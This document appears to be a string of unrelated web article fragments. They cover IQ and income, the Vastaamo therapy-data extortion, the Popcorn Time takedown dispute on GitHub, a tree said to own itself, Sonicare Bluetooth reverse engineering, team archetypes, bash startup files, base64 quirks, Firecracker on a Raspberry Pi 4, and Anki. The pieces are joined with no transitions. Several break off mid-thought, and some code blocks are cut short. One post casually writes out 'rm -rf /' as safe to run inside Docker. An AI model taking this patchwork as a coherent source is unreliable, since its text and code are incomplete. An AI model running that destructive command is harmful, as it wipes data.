<p>(Edit: In case this is not clear, Taleb uses the above figure as an illustration, not as a precise empirical claim.) It’s quite easy to look into the data to see whether this actually is the case. We can use the same two data sets used above.</p>
<p>If we plot IQ vs log(income), that will tell us how large a percentage increase in income each extra IQ point gives. Then we can plot a local regression (loess) and compare that to a linear regression. If the relationship between IQ and income radically diminished at above average IQ, then we would expect the loess regression line to approach horizontal. However, this is not what we see - instead the two regression lines follow each other quite closely. It is true that the percentage increase in income per IQ point is a little higher for lower IQs, but it never stagnates.</p>

                    <p>The Finns were stunned this Friday at the outcome of a scandal caused by the <strong>extortion of a group of hackers</strong> to&nbsp;a private company that provides services as a psychotherapy center for the public health system.</p>

<p>In a country that claims to be at the forefront of digitization and data security, the criminals managed to access the database of thousands of customers of <strong>the company Vastaamo</strong> after detecting vulnerabilities in their system.</p>

<p>According to its website, Vastaamo offers psychological and psychiatric treatment to patients who suffer from disorders such as <strong>depression and anxiety</strong>.&nbsp;Many of the clients come from public services paid by the Finnish&nbsp;<strong>Social Security (Kela)</strong>.</p>

<p>Extortionists demanded around<strong> 450,000 euros (in bitcoins)</strong> in exchange for not publishing the clinical and mental health data of thousands of people.</p>

<p>The criminals started to publish <strong>the data of 100 people every day in the encrypted web Tor&nbsp;</strong>two days ago. They claimed they would not stop until&nbsp;they received the money.&nbsp;As the company was&nbsp;resisting to attend the demands of the hackers, personal data of over 200&nbsp;people - including minors - have been released online.</p>

<p>The information published could not be more sensitive: it included&nbsp;the patient's name, personal identification number, telephone number, email address and residence address, together <strong>with the content of the therapy sessions</strong>.</p>

<p>"An unknown hostile party has been in contact with Vastaamo and claims to have obtained confidential information from the company's customers.&nbsp;The Central Criminal Police launched a criminal investigation into the matter.&nbsp;Immediate notifications were also made to the Finnish Cyber ​​Security Center, Valvira and the Data Protection Commissioner.&nbsp;In addition, Vastamo took immediate steps to clarify the matter in cooperation with external and independent security experts," the company said in a press release.</p>

<h2>Rumours of ransom payment</h2>

<p>The data of <strong>another 100 people were published on Thursday </strong>night. But on Friday morning the page where the data was being released had been deleted, which triggered rumors about a possible payment to the extortionists.</p>

<p>At the time of writing this article, the company had&nbsp;neither confirmed nor denied the payment.&nbsp;<strong>Tuomas Kahri</strong>, Chairman of the Board of Vastaamo, told to the newspaper Ilta Sanomat that <strong>he would not comment on the ransom payment </strong>allegations.</p>

<p>The identity or nationality of the extortionists is unknown, and they appeared to not be worried about their possible arrest by the authorities.</p>

<p><strong>Ilta Sanomat </strong>exchanged several messages with them on Thursday, and according to the tabloid the criminals said they did not know that there was data of minors among the published information. However, they ensured that this would not stop their actions.</p>

<p>According to the same newspaper, the blackmailer had&nbsp;also offered individual patients the possibility of deleting their own data by <strong>paying about 540 euros in bitcoins</strong>.</p>

<h2>Police investigation</h2>

<p><strong>The National Bureau of Investigation (KRP)</strong> is investigating the attack as a case of gross breach and dissemination of private information. Police are asking people who have noticed their private information being disseminated to file an electronic crime report.</p>

<p>The company has been criticized for failing to notify customers earlier that their data was exposed in this extortion case. Some have complained they were contacted only after the case became known to the general public.</p>

			<p>For more than half a decade, Popcorn Time has been a thorn in the side of Hollywood. </p>
<p>The ‘Netflix for Pirates’ offers an easy-to-use application that opens the door to a library of thousands of streamable movies and TV-shows. </p>
<p>The Motion Picture Asociation (MPA) recognized this threat early on and pressured the original developers to throw in the towel. That worked, but it came too late as the open-source project was swiftly revived by others.</p>
<p>Today, Popcorn Time lives on through many project forks. The most popular is PopcornTime.app, which like its predecessor, <a href="https://github.com/popcorn-official" target="_blank">shares its source code publicly</a> on the developer hosting platform GitHub. This allows others to download, modify, and share it. </p>
<p>The MPA is not happy with this and took action recently. The movie industry group <a href="https://torrentfreak.com/mpa-suggests-github-could-be-held-liable-for-popcorn-times-copyright-infringements-200505/" target="_blank">informed GitHub</a>, which is owned by Microsoft, about the infringing nature of the software. According to the MPA, the application includes links to pirate sites, pirate APIs, and pirate torrent trackers, which are used to download pirated movies and TV-shows.</p>
<center><img src="https://torrentfreak.com/images/mparequest.jpg" alt="" width="500" height="354" srcset="https://passivetech.com/wp-content/uploads/2020/05/cd1cc7f20aa83c5321df90abe40fe86c.jpg 625w, https://torrentfreak.com/images/mparequest-600x424.jpg 600w" sizes="(max-width: 500px) 100vw, 500px" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20500%20354'%3E%3C/svg%3E" data-lazy-srcset="https://passivetech.com/wp-content/uploads/2020/05/cd1cc7f20aa83c5321df90abe40fe86c.jpg 625w, https://torrentfreak.com/images/mparequest-600x424.jpg 600w" data-lazy-src="https://torrentfreak.com/images/mparequest.jpg"></center>
<p>On top of that, the MPA suggested that GitHub itself may be liable for copyright infringement if the company fails to take action. </p>
<p>While the MPA’s interpretation of the law is likely not shared by GitHub, the company did remove the Popcorn Time code. In most cases that would be the end of the story, but Popcorn Time was not backing off without a fight. </p>
<p>The developers submitted a DMCA counternotice explaining that the MPA’s request is not legitimate. The code is owned by Popcorn Time, not the MPA, and Popcorn Time asked GitHub to restore access. </p>
<p>“The code is 100 % ours and do not contain any copyright [sic] material please check again,” the <a href="https://github.com/github/dmca/blob/d7f4a6a3aade92999d4d86962972c4b27af820e3/2020/05/2020-05-04-MPA-counternotice.md" target="_blank">developer wrote</a>.</p>
<p>The app’s developers made a good point here. The identified code (not the built app) is not directly copyright infringing and it contains no direct links to copyright-infringing material either. This means that a DMCA notice may not be the right tool here.</p>
<p>Faced with both requests, GitHub has now decided to restore full access to the Popcorn Time repository. </p>
<p>This decision doesn’t necessarily mean that it agrees with the app developers, however. The DMCA simply prescribes that, following a counternotice, content can be restored after two weeks, unless the claiming party files a lawsuit. </p>
<center><img src="https://torrentfreak.com/images/popcorngit.jpg" alt="" width="590" height="451" srcset="https://passivetech.com/wp-content/uploads/2020/05/6bbe8d7f2ef64e3124e0ef0005129d46.jpg 1101w, https://torrentfreak.com/images/popcorngit-600x459.jpg 600w" sizes="(max-width: 590px) 100vw, 590px" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20590%20451'%3E%3C/svg%3E" data-lazy-srcset="https://passivetech.com/wp-content/uploads/2020/05/6bbe8d7f2ef64e3124e0ef0005129d46.jpg 1101w, https://torrentfreak.com/images/popcorngit-600x459.jpg 600w" data-lazy-src="https://torrentfreak.com/images/popcorngit.jpg"></center>
<p>In this case, the MPA chose not to file a lawsuit against the Popcorn Time operators, so the code repositories are back online again. </p>
<p>Whether the MPA will follow-up with further action has yet to be seen. However, the whole episode highlights an interesting issue. There is little doubt that the Popcorn Time application is a pirate app. However, the code, as hosted by GitHub, is not infringing per se. As such, regular takedown notices don’t appear to work here.</p>

		<p>No matter how famous or how ancient, all trees are ultimately owned by someone. It could be a government, a trust, or even just an individual caretaker. However, one white oak tree in Athens, Georgia was reportedly so beloved by its owner that upon his death, he gave the tree ownership of itself in his will.<span id="more-2706"></span></p>
<h2>The Legend of the Tree That Owns Itself</h2>
<p>The legend goes that a particularly large and beautiful white oak played a special role in the childhood of its owner, Colonel William Henry Jackson. When he died some time between 1820 and 1832, he deeded the tree and the soil around it to the tree itself. Here is the reported text of his will:</p>
<blockquote><p>I, W. H. Jackson, of the county of Clarke, of the one part, and the oak tree&nbsp;… of the county of Clarke, of the other part: Witnesseth, That the said W. H. Jackson for and in consideration of the great affection which he bears said tree, and his great desire to see it protected has conveyed, and by these presents do convey unto the said oak tree entire possession of itself and of all land within eight feet [2.4 m] of it on all sides.</p></blockquote>

<p>After that, the tree become known as the Tree that Owns Itself. However, there are a number of problems with the story’s validity. It originally ran as a front page story in the <em>Athens Banner Weekly</em> on August 12, 1890. That’s some 60 years after the supposed transaction took place, and there are no indications that anything special had happened to the tree before that (although it was known as Jackson’s Tree).</p>
<p>On top of that, the only witness to the will itself is the author of the article, and no one has been able to confirm that the statement above was ever made. However, the story became so popular that no one dared doubt the tree’s self-ownership. Effectively, the tree owned itself because everyone said it did.</p>
<p>Legally, of course, the tree isn’t able to own itself regardless of Jackson’s wishes. In fact, careful examination of property lines reveals that the tree isn’t even on his property. It’s officially part of the street (since it’s part of a median in the middle of the street), so its care falls to local authorities.</p>
<p>However, the tree is such a well respected landmark in the city that the Athens-Clarke County government has declared that in spite of the actual legality, the tree owns itself. Because they said so.</p>

<h2>Can a tree have rights?</h2>
<p>It might seem strange that a tree can own anything, let alone itself, but there is actually some legal precedent. Although they usually take a back seat to animal rights, plant rights have been discussed in several countries around the world.</p>
<p>In the Netherlands, a party called <a href="https://in.reuters.com/article/us-dutch-election-plants/plant-rights-party-to-contest-next-dutch-election-idINTRE62S2HA20100329">the Party for the Plants</a> was created to try to snag a few seats in the 2010 parliamentary elections. Although they weren’t particularly successful, their platform focused exclusively on promoting biodiversity and protecting plants from being harvested for biofuels.</p>
<p>More success has been found in New Zealand, where for the first time anywhere a forest was granted legal personhood and ownership of itself. The&nbsp;Te Urewera Act of 2014 changed the legal status of Te Urewera, a forest sacred to the Maori people, from a Natural Park into <a href="http://maorilawreview.co.nz/2014/10/tuhoe-crown-settlement-te-urewera-act-2014/">its own legal entity</a>.</p>

<p>Obviously the forest can’t speak for itself, so a board was set up “to act on behalf of, and in the name of, Te Urewera”. In March 2017 a second act was passed granting similar rights to the Whanganui River, since the local Maori tribe consider the river itself to be their ancestor.</p>
<p>Although it doesn’t go as far as giving trees and other plants ownership of themselves, the Clean Water Act of 1972 in the United States effectively grants them some rights. Under the ‘natural resource damage’ provisions of the law, trees and other resources have some basic rights. It’s the government, however, that’s entrusted with protecting those rights, although any money earned through litigation must be spent on the resource itself. Essentially, the money <em>belongs</em> to the resource.</p>
<h2>The Son of The Tree That Owns Itself</h2>
<p>The Tree That Owns Itself might have been granted semi-legal status in Athens-Clarke County, but that didn’t protect it from the whims of Mother Nature. It was heavily damaged in an ice storm in 1907, and eventually fell down in 1942. Many suspected that the tree had died long before falling.</p>
<p>But if the tree owned land, surely it must pass on to its next of kin. A tree grown from an acorn of the Tree That Owns Itself was selected as the heir, an transplanted into its new home in 1946. It also inherited the name, although it’s also referred to as the Son of the Tree That Owns Itself.</p>

<p>It’s now been more than 70 years since the tree moved in to the quiet residential neighborhood on Finley Street, and it appears to be doing well. Despite its unknown legal status, the legend lives on with a plaque commemorating the words that started it all. Slightly edited to be more intelligible to modern readers, it reads:</p>
<blockquote><p>For and in consideration of the great love I bear this tree and the and the great desire I have for its protection for all time, I convey entire possession of itself and all land within eight feed of the tree on all sides<br>
-William M Jackson</p></blockquote>

            <p>Since a few month I own an electrical toothbrush from Phillips called <a href="https://www.google.com/search?q=Sonicare+HX992B">Sonicare HX992B</a>. It connects to <a href="https://play.google.com/store/apps/details?id=com.philips.cdp.ohc.tuscany" title="App">an mobile App</a> using Bluetooth that tells you how well you brushed your teeth, shows the orientation in real-time, and also notifies you when to change the brush for a new one.</p>
            <p><img src="https://blog.johannes-mittendorfer.com/assets/img/sonicare-image.jpeg" alt="Phillips Sonicare"></p>
            <p>I was curious how this exactly works. Since the application uses Bluetooth Low Energy (BLE), I used the <a href="https://play.google.com/store/apps/details?id=no.nordicsemi.android.mcp">nRF Connect</a> app for Android to get a list of advertised services.</p>
            <p><img src="https://blog.johannes-mittendorfer.com/assets/img/whatsapp-image-2020-10-09-at-19-34-24.jpeg" alt="Screenshot of nRF connect" title="Screenshot of nRF connect"></p>
            <p>Now I had a list of 12 BLE services of which only four are <a href="https://www.bluetooth.com/de/specifications/gatt/" title="List of common services">standard services described on bluetooth.com</a>. In addition to well-known services like Generic Access, Generic Attribute, Device Information and Battery Service, also eight custom services exist, that were created by the manufacturer. Every one of the first seven service UUIDs starts with <code>477ea600-a260-11e4-ae37-0002a5d5000</code> and ends with a number from 1 to 8 with number 3 missing. An additional eight service has a completely different prefix than the others.</p>

            <p>By switching the device on and off, changing the strength and mode and also by changing the brush back and forth, I was able to identify some of the characteristics of the six services. By reverse engineering the code of the Android app using <a href="https://github.com/skylot/jadx">jadx</a> I found information about the session storage and many other things.</p>

            <p>According to the application sources, the last unknown service is called “Moonshine Streaming” and is used to update the firmware. I agreed with myself to not touch this one, since I could damage the firmware and would need to brush my teeth by hand again.</p>
            <p>Since I could see a very course orientation displayed in the app during a cleaning session, I expected orientation data somewhere in the characteristics. I found them in the service <code>5</code>. Once you enable notifications for the <code>4130</code> service, you get a data stream to byte arrays. It turns out, these are indeed the values of the gyroscope.</p>

<p><em>Caveat</em>: what you’ll read about are (usually) not personality types but behaviors in a specific (type of) situation. Acting like a HIPPO, a WOLF, a RHINO or a ZEBRA doesn’t make anyone a bad person. You’re still a team, aim to understand where they are coming from, and, well, they might even be right, with the wrong communication style. </p>

<p>It can be tempting to give in to the HIPPOs – founders or CEO or VPS who want to make all the decisions – but don’t let them steer you off course.</p>
<p>Bring everything back to your vision and objectives. If the HIPPOs aren’t aligned with those, you could be headed for dangerous waters.</p>
<p>Don’t let your HiPPO kill your ideas – inform them with data and make them a <a href="https://www.forbes.com/sites/bernardmarr/2017/10/26/data-driven-decision-making-beware-of-the-hippo-effect/" target="_blank" rel="noopener">Data-driven HiPPO</a>! </p>

<h2>The WOLF – Working On the Latest Fire</h2>
<div>
<div>
<p>The WOLF has a short attention span and a temptation to jump from one problem to the next. They tend to only enjoy fighting fires, This will disrupt your team’s focus and effectiveness, making you easy prey for your competitors.</p>
<p>Create a process for collecting feedback about problems, bugs and only consider these along with all other requests. Set up triaging and set clear priorities and a method for prioritization.</p>

<p>The RHINO is just there to collect a paycheck without contributing much to the team. They might not be actively impeding your decision-making, but they are not helping much either. </p>
<p>Having a clearly defined prioritization process can help ensure all your team members understand how decisions are made and give them the confidence to actively participate. Hopefully, in this process, everyone is empowered to have a say and it doesn’t turn into “Well our process is that the boss tells you what’s important” – which is exactly how you end up with a team of disillusioned RHINOs.</p>

<h2>The ZEBRA – Zero Evidence But Really Arrogant</h2>
<div>
<div>
<p>ZEBRAs think they know it all but rely on their instinct rather than any actual evidence. To stave off the ZEBRAs in your midst, make sure that you’ve got data to back up your decisions.</p>
<p>Come up with quick experiments you can run to test ideas and gather evidence. Push for a data-driven culture.</p>

<h2>And one extra…. the RHINO again! This time, Really High value New Opportunity</h2>
<p>Usually, it’s a salesperson with an amazing value customer deal for an unplanned feature insisting re-allocating resources to build what’s required to win the deal. The results, sadly, are an ignored strategy and roadmap and resources allocated to serve a single customer.</p>
<p>There are two ways here:</p>
<p>1, Chase the RHINO away: Compare the opportunity cost and value and argue against signing the deal if you have customer insight supporting the roadmap.<br>2, Tame the RHINO: Adjust the roadmap if the opportunity includes features you already had planned for later in the year.</p>

      <h3 id="introduction">Introduction</h3>

<p>Sometimes, when I remotely login to some Linux computers or use Docker containers, I would find the shell is plain black and white, different from the colorful shell I am used to dealing with on my local machine. This sometimes makes it difficult to look for libraries, executables, and folders. Sometimes, some executables could be called directly from a local shell but from a remote login shell they are not directly callable.</p>



<p>It turns out that the shell is an executable and it is “configured” by special shell scripts such as <code>~/.bashrc</code>, <code>~/.profile</code>, <code>~/.bash_profile</code>. In this blog post, I would like to briefly discuss the differences between these scripts.</p>

<h3 id="bashrc">~/.bashrc</h3>

<p>I modify the <code>~/.bashrc</code> file from time to time, because sometimes I would like to set some environment variables, including <code>PATH</code> which is an environmental variable in Linux and other Unix-like operating systems that tells the shell which directories to search when looking for executable files. But I have been ignoring the commented block at its beginning for decades.</p>

<div><div><pre><code>$ cat ~/.bashrc 
# ~/.bashrc: executed by bash(1) for non-login shells.
# see /usr/share/doc/bash/examples/startup-files (in the package bash-doc)
# for examples
...
</code></pre></div></div>

<p>This means that in a local shell where <code>bash</code> is being used, this shell script will be executed immediately after <code>bash</code> is executed. There are many other shell executable variants, such as <code>zsh</code>. <code>~/.bashrc</code> is only specific to <code>bash</code>.</p>



<p>There are many settings in the <code>~/.bashrc</code> that makes the shell look colorful. For example,</p>

<div><div><pre><code># enable color support of ls and also add handy aliases
if [ -x /usr/bin/dircolors ]; then
    test -r ~/.dircolors &amp;&amp; eval "$(dircolors -b ~/.dircolors)" || eval "$(dircolors -b)"
    alias ls='ls --color=auto'
    #alias dir='dir --color=auto'
    #alias vdir='vdir --color=auto'

    alias grep='grep --color=auto'
    alias fgrep='fgrep --color=auto'
    alias egrep='egrep --color=auto'
fi
</code></pre></div></div>

<h3 id="profile">~/.profile</h3>

<p>The comment block found in the <code>~/.profile</code> explicitly tells us that it will be executed for the login shells. However, if <code>~/.bash_profile</code> or <code>~/.bash_login</code> exists, <code>~/.profile</code> will not be executed.</p>

<div><div><pre><code>$ cat ~/.profile 
# ~/.profile: executed by the command interpreter for login shells.
# This file is not read by bash(1), if ~/.bash_profile or ~/.bash_login
# exists.
# see /usr/share/doc/bash/examples/startup-files for examples.
# the files are located in the bash-doc package.

# the default umask is set in /etc/profile; for setting the umask
# for ssh logins, install and configure the libpam-umask package.
#umask 022

# if running bash
if [ -n "$BASH_VERSION" ]; then
    # include .bashrc if it exists
    if [ -f "$HOME/.bashrc" ]; then
	. "$HOME/.bashrc"
    fi
fi

# set PATH so it includes user's private bin if it exists
if [ -d "$HOME/bin" ] ; then
    PATH="$HOME/bin:$PATH"
fi

# set PATH so it includes user's private bin if it exists
if [ -d "$HOME/.local/bin" ] ; then
    PATH="$HOME/.local/bin:$PATH"
fi
</code></pre></div></div>

<p>The default content of the <code>~/.profile</code> is simple. In most cases, it inherits whatever is in the <code>~/.bashrc</code>, and adds some user specific executable filepath to the environment variable <code>PATH</code>. So if there are commands that make the shell look colorful in the <code>~/.bashrc</code>, the login shell should also look colorful.</p>

<h3 id="bash_profile">~/.bash_profile</h3>

<p>Unfortunately, in most of my login trials, the shells were never colorful, and sometimes the environment variables did not match my expectation. In those cases, this is because there exists a <code>~/.bash_profile</code> and therefore <code>~/.profile</code> or <code>~/.bashrc</code> is never executed. Usually the <code>~/.bash_profile</code> will be empty, which means that we would not have the environment and appearance that we have in our local shell.</p>



<p>To make the login shell “back to normal”, we could either delete the <code>~/.bash_profile</code> or modify the <code>~/.bash_profile</code> by adding some commands like</p>



<h3 id="caveats">Caveats</h3>

<p>Sometimes, a non-color shell could be helpful. It can be used to indicate that you are not working in local shell, and that what you are seeing could either be a Docker shell or a remote login shell. When we know what shell we are dealing with, we will be more likely to avoid dangerous operations. For example, in a Docker shell, we could do almost anything, such as <code>rm -rf /</code> without sudo, without harming the local system.</p>

<h3 id="acknowledgement">Acknowledgement</h3>

<p>I would like to thank Liam Keane from Hacker News for correcting the grammars and polishing the words in the blog post.</p>

        <p><a href="https://en.wikipedia.org/wiki/Base64">Base64-encoding</a> is ubiquitous in our
modern world. Many programs communicate in base64-encoded messages, since these
have nice properties: They consist of a very limited subset of ASCII characters,
and can thus be displayed as text. E-Mails for example are commonly encoded in
base64 in transfer, which can be seen in the <code>Content-Transfer-Encoding</code> header.</p>

<p>Where I volunteer we have a tradition of putting <code>changeme</code> as a placeholder for
many template variables indicating that they should be overwritten later. Thus,
if we later still see <code>changeme</code> anywhere we know that somewhere somebody must
have forgotten to specify a variable<sup id="fnref:1"><a href="#fn:1">1</a></sup>.</p>

<p>Sometimes these template variables should correspond to base64-encoded content,
i.e. the base64-decoding of said variable should produce meaningful content. But
what happens if somebody forgets to define said variable, and it is substituted
with<code>changeme</code> instead? I always thought that it would fail to
decode the string since the probability that <code>changeme</code> is actually valid base64
encoding must be very low. But lo and behold, this is not the case:</p>

<pre><code>% echo changeme | base64 -d
r�[1m
</code></pre>

<p>Running <code>hexdump</code> on the output we can identify the characters:</p>

<pre><code>% echo changeme | base64 -d | hexdump -C
00000000  72 16 a7 81 e9 9e      |r.....|
00000006
</code></pre>

<p>Mostly nonsense, but the second byte is interesting: It is an ASCII control
character <sup id="fnref:2"><a href="#fn:2">2</a></sup>, meaning trips up all sorts of programs which expect to read
printable ASCII characters, such as JSON deserializers.</p>

<p>This bug actually occurred when I was migrating some applications between
different Kubernetes clusters: In the old cluster the application ran without
problems, but I forgot to specify some variable in the new cluster, and it lead
to Go complaining about non-ASCII characters in a JSON string.</p>

<p>I guess the moral of the story is: If you use dummy values be sure that they
cannot be misinterpreted.</p>

<![CDATA[Porting Firecracker to a Raspberry Pi 4 (2019)]]>

October 24, 2020 | https://blog.cloudkernels.net/posts/firecracker-rpi4/ | <a href="https://web.archive.org/web/*/https://blog.cloudkernels.net/posts/firecracker-rpi4/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      

<p>Since we got our hands on the new Raspberry Pi 4, we started exploring how
various virtualization technologies behave on the board. First thing we tried is how to run <a href="https://cloudkernels.github.io/posts/rpi4-64bit-virt/">Nabla</a> on it and how it compares to native KVM.</p>

<p>Next thing we wanted to try is <a href="https://github.com/firecracker-microvm/firecracker">firecracker</a>, the notorious micro-VMM that
Amazon Lambda &amp; Fargate run on. To our disappointment, firecracker was not
<a href="https://github.com/firecracker-microvm/firecracker/issues/1196">yet</a> running on RPi4. So we started looking into coding in the necessary
changes :)</p>

<p>After a bit of investigation, we figured out that the key missing piece is
support for the GICv2 ARM interrupt controller. In fact, firecracker only
supports GIC version 3 since it was open-sourced, but not version 2, which is
the version appearing in the Raspberry Pi series, as well as in other popular
boards, like the Hikey 970 we got our hands on, or Khadas VIM3. A bit more
digging into the internals of firecracker and the Linux kernel, helped us
work out the details and open a <a href="https://github.com/firecracker-microvm/firecracker/pull/1235">pull-request</a> which adds support for the
missing parts.</p>

<h4 id="changes-in-firecracker">Changes in Firecracker</h4>

<p>The Generic Interrupt Controller (GIC) is the IP block in the ARM processors
that implements interrupt handling. The Linux kernel supports user- and
kernel-space emulation for GICv2 as well as GICv3 and v4. However, Firecracker
only handles the GICv3-related configuration of the virtual GIC (VGIC).
Similarly, setting up the FDT for the guest microVM from Firecracker only
handles GIC-v3 devices.</p>

<p>In terms of code organization, the GIC related code currently exposes a function
for setting up GICv3 performing the corresponding <code>ioctl</code> KVM commands. The
first part of our PR changes this by introducing a GIC Trait which defines the
common interface for all GIC implementations. Even though it is still under
discussion, what exactly will be in the Trait in its final form, it will be
something along the following lines:</p>
<div><pre><code data-lang="rs"><span>/// Trait for GIC devices.
</span><span></span><span>pub</span><span> </span><span>trait</span><span> </span>GICDevice<span> </span>{<span>
</span><span>    </span><span>/// Returns the GIC version of the device
</span><span></span><span>    </span><span>fn</span> <span>version</span>(<span>&amp;</span><span>self</span>)<span> </span>-&gt; <span>u32</span>;<span>
</span><span>
</span><span>    </span><span>/// Returns the file descriptor of the GIC device
</span><span></span><span>    </span><span>fn</span> <span>device_fd</span>(<span>&amp;</span><span>self</span>)<span> </span>-&gt; <span>&amp;</span><span>DeviceFd</span>;<span>
</span><span>
</span><span>    </span><span>/// Returns an array with GIC device properties
</span><span></span><span>    </span><span>fn</span> <span>device_properties</span>(<span>&amp;</span><span>self</span>)<span> </span>-&gt; <span>&amp;</span>[<span>u64</span>];<span>
</span><span></span>}<span>
</span></code></pre></div>
<p>With this in place, we can define objects per GIC version, which implement this
Trait, and still have the rest of the code deal with the <code>GICDevice</code> Trait,
which is transparent to the GIC version.</p>

<p>The implementations for each version, implement the Trait and a <code>new</code> function
which is used to create the new object:</p>
<div><pre><code data-lang="rs"><span>pub</span><span> </span><span>fn</span> <span>new</span>(vm: <span>&amp;</span><span>VmFd</span>,<span> </span>vcpu_count: <span>u64</span>)<span> </span>-&gt; <span>Result</span><span>&lt;</span><span>Box</span><span>&lt;</span>GICDevice<span>&gt;&gt;</span><span>
</span></code></pre></div>
<p>The differentiation between the two versions lays in the VGIC register
attributes that each device exposes. As a result, the work we need to do is essentially to <code>mmap</code> their addresses.</p>

<p>GICv2 relevant addresses include the <strong>distributor</strong> and <strong>cpu</strong> groups:</p>
<div><pre><code data-lang="rs"><span>/* Setting up the distributor attribute.
</span><span> We are placing the GIC below 1GB so we need to substract the size of the distributor.

</span></code></pre></div>
<p>whereas the GICv3 includes the <strong>distributor</strong> and <strong>redistributor</strong> groups:</p>
<div><pre><code data-lang="rs"><span>/* Setting up the distributor attribute.

<p>Finally, for both versions of GIC we finalize the device initialization by
setting the number of supported interrupts and the <em>control_init</em> group.</p>

<p>Regarding the FDT creation, there are differences between v2 and v3 regarding
the interrupt controller <code>intc</code> node.</p>

<p>First, we need to define the GICv2 <code>compatible</code> property to be <code>arm,gic-400</code>,
since it is the GIC-400 chip which implements GICv2. Next is the <code>reg</code>
property of the FDT, which includes the addresses and the corresponding sizes of
the GIC registers, i.e. distributor and CPU for GICv2, distributor and
redistributor for GICv3. Finally, we fix the <code>interrupts</code> property which
determines the interrupt source of the VGIC maintenance interrupt. The
corresponding values for GICv2 were taken from the respective <a href="https://github.com/torvalds/linux/blob/master/Documentation/devicetree/bindings/interrupt-controller/arm%2Cgic.yaml">Linux Kernel entries</a>.</p>

<h4 id="build-firecracker-with-rpi4-support">Build firecracker with RPi4 support</h4>

<p>While waiting for the patch to merge upstream you can go ahead and check out it
yourself.</p>

<p>Clone and build our fork of firecracker (keep in mind that while the PR review
is going on, we might force-update the branch).</p>
<div><pre><code data-lang="bash">$ git clone https://github.com/cloudkernels/firecracker.git
$ <span>cd</span> firecracker
$ ./tools/devtool build</code></pre></div>
<p>Next you need a kernel image and a root filesystem to run with your firecracker
build. You can grab the pre-built kernel image and rootfs here:</p>
<div><pre><code data-lang="bash">$ wget https://s3.amazonaws.com/spec.ccfc.min/img/aarch64/ubuntu_with_ssh/kernel/vmlinux.bin
$ wget https://s3.amazonaws.com/spec.ccfc.min/img/aarch64/ubuntu_with_ssh/fsfiles/xenial.rootfs.ext4 </code></pre></div>
<p>Alternatively, you can build your own kernel and rootfs using the following
steps provided by the firecracker docs
<a href="https://github.com/cloudkernels/firecracker/blob/master/docs/rootfs-and-kernel-setup.md">here</a></p>

<h4 id="launch-our-image">Launch our image</h4>

<p>To launch our image we will use the <a href="https://github.com/firecracker-microvm/firectl">firectl</a> tool. We need, to setup a tap
device for the networking or our firecracker microVM.</p>
<div><pre><code data-lang="bash">$ sudo ip tuntap add dev tap0 mode tap
$ sudo ip addr add <span>172</span>.16.0.1/24 dev tap0
$ sudo ip link <span>set</span> tap0 up</code></pre></div>
<p>And we launch the microVM using firectl:</p>
<div><pre><code data-lang="bash">firectl --firecracker-binary<span>=</span><span>${</span><span>PATH_TO_FC_BIN</span><span>}</span> --kernel<span>=</span>vmlinux.bin <span>\
</span><span></span>	--tap-device<span>=</span>tap0/aa:fc:00:00:00:01 <span>\
</span><span></span>	--kernel-opts<span>=</span><span>"console=ttyS0 reboot=k panic=1 pci=off ip=172.16.0.42::172.16.0.1:255.255.255.0::eth0:off"</span> <span>\
</span><span></span>	--root-drive<span>=</span>./nginx_fc.ext4</code></pre></div>
<p>Here, we used here the <code>ip</code> kernel boot parameter to give the <code>172.16.0.42</code>.</p>

<p>Finally, we try out our nginx server:</p>
<div><pre><code data-lang="html">curl 172.16.0.42
<span>&lt;!DOCTYPE html&gt;</span>
&lt;<span>html</span>&gt;
&lt;<span>head</span>&gt;

        <span>width</span>: <span>35</span><span>em</span>;
        <span>margin</span>: <span>0</span> <span>auto</span>;
        <span>font-family</span>: Tahoma, Verdana, Arial, <span>sans-serif</span>;
    }
&lt;/<span>style</span>&gt;
&lt;/<span>head</span>&gt;
&lt;<span>body</span>&gt;
&lt;<span>h1</span>&gt;Welcome to nginx!&lt;/<span>h1</span>&gt;
&lt;<span>p</span>&gt;If you see this page, the nginx web server is successfully installed and

<p>TL;DR: <em>If you aren’t using <a href="https://apps.ankiweb.net/">Anki</a> or one of its siblings to remember what you learn, you are missing out on literal superpowers. There are specific techniques which I’ve found helpful for using it to learn maths and computer science in particular.</em></p>
<p>This post will discuss extremely briefly what Anki is, but is mainly aimed at helping the student of maths or computer science to squeeze out some extra droplets of productivity from it. If you aren’t already familiar with Anki, go and read Michael Nielsen’s post <a href="http://augmentingcognition.com/ltm.html">Augmenting Long-Term Memory</a> as well or instead of this one; if you’re short of time, the main value of the post to someone new to Anki is in the first one-eighth or so, up to but not including “Using Anki to thoroughly read a research paper in an unfamiliar field”. That essay gives a broad-strokes motivation for why one might want to use Anki at all. (Spoiler: it gives you a superhuman memory!)</p>

<p><a href="https://apps.ankiweb.net/">Anki</a> is a <a href="https://en.wikipedia.org/wiki/Spaced_repetition">spaced repetition system</a>: essentially a program that shows you flashcards at intervals tailored to help you remember their contents. Such systems are based on the observation that while you can’t stop memories from decaying, repeated exposure makes the decay exponentially slower.</p>
<p>So while you need to rehearse a fact frequently when you first come to learn it, reviews can become very sparse very quickly without losing much of your hard-won memory.</p>
<p>Anki is only one such system; other implementations such as SuperMemo and Mnemosyne exist.<br>
There are also applications using the same principles for more specific goals; for example, Memrise is designed for language learning. This post is phrased in terms of Anki, because for historical reasons that’s the one I use.</p>

<p>I’ve placed this section at the start, because I believe that spaced repetition is genuinely a superpower that anyone can acquire. If I can’t hold your interest in this post, I encourage you to glance over these other resources in the hope that one of them does the trick!</p>
<ul>
<li><a href="http://augmentingcognition.com/ltm.html">Augmenting Long-Term Memory</a> –&nbsp; a brief introduction to various memory systems with a particular focus on Anki. The money quote: “Anki makes memory a choice”. If you choose to remember something, you can.</li>
<li><a href="https://quantum.country/">Quantum Country</a> – an introduction to quantum computation with integrated spaced-repetition flashcards, which comes with emailed reminders to use the site at intervals. Even if you have no interest in quantum computation, I recommend skimming at least the first bits of the site, so that you can see what really good flashcards based on a text can look like. (Note that some of its cards are not ideal; the site does sometimes fall into the “yes/no” pattern, with flashcards whose answer is a bald “yes” or “no”. Cards of this form aren’t as good as cards which get you to reproduce actually content-based parts of a fact.)</li>
